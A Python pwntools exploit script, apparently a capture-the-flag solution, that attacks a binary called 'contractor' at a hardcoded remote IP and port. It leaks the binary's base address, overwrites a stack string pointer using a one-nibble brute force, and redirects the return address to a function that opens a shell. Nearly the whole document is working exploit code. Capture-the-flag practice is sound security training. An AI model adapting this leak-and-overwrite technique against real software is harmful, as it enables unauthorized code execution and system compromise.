#!/usr/bin/env python3

from pwn import *

exe = ELF("contractor_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("94.237.59.98", 35457)

    return r


# NOTE: The program has the first 3 nibble of stack randomized for some reason. The exploit would be more reliable if they weren't :/
def main():
    r = conn()

    # Starting info (almost all of them are useless but the last one which is near a binary address `__libc_csu_init`)
    r.sendlineafter(b"> ", b"A")
    r.sendlineafter(b"> ", b"A")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"A" * 0x10)     # This will leak binary base address

    # From the '[Speciality]' section we can leak the binary's base address
    r.recvuntil(b"[Specialty]: ")
    exe.address = u64(r.recvline().strip()[16:].ljust(8, b"\x00")) - exe.sym.__libc_csu_init
    log.info(f"exe: 0x{exe.address:x}")

    # Now we need to blindly change the string pointer (which points at the beginning of the stack buffer) to a stack
    # address after canary, precisely our return address. We need to "bruteforce" just one nibble in this case.
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"good at: ", b"A" * 0x18 + p64(0x4) + p8(0xc0))
    r.sendlineafter(b"> ", b"no")       # One more iteration

    # Now that the pointer (hopefully) points to the return address, we can change it to `contract()`.
    # We use the first option because the program takes into account offsets to write to the stack buffer.
    # This option is at offset '0' so we are gonna write directly to the return address.
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"good at:" , p64(exe.sym.contract))

    # NOTE: The program will exit on its own because we also overwrite the variable to exit the loop
    # Enjoy the shell :)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
